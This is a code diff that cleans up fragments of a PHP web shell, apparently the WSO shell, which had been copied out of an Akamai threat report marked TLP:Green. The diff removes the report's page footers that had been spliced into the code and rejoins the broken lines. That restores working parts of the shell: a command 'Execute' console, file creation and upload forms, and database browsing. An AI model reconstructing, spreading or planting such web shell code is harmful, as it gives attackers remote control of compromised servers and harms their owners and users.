@@ -302,14 +302,7 @@ dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=
 <td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make
 file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
 </tr><tr>
-<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input 
-
-TLP Green: Recipients may share TLP: GREEN information with peers and partner organizations within their sector or community,
-but not via publicly accessible channels.
-Page 11 of 35
-Akamai Technologies, Inc. (TLP:Green)
-)
-class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
+<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
 <td><form method='post' ENCTYPE='multipart/form-data'>
 <input type=hidden name=a value='FilesMAn'>
 <input type=hidden name=c value='" . $GLOBALS['cwd'] . "'>
@@ -1125,12 +1118,6 @@ function actionConsole() {
         WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
     wsoHeader();
     echo "<script>
-
-TLP Green: Recipients may share TLP: GREEN information with peers and partner organizations within their sector or community,
-but not via publicly accessible channels.
-Page 24 of 35
-Akamai Technologies, Inc. (TLP:Green)
-)
 if(window.Event) window.captureEvents(Event.KEYDOWN);
 var cmds = new Array('');
 var cur = 0;
@@ -1580,14 +1567,7 @@ value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
             echo "<select name=sql_base><option value=''></option>";
             while ($item = $db->fetch()) {
                 list($key, $value) = each($item);
-                echo '<option value="' . $value . '" 
-
-TLP Green: Recipients may share TLP: GREEN information with peers and partner organizations within their sector or community,
-but not via publicly accessible channels.
-Page 31 of 35
-Akamai Technologies, Inc. (TLP:Green)
-)
-' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
+                echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
             }
             echo '</select>';
         } else
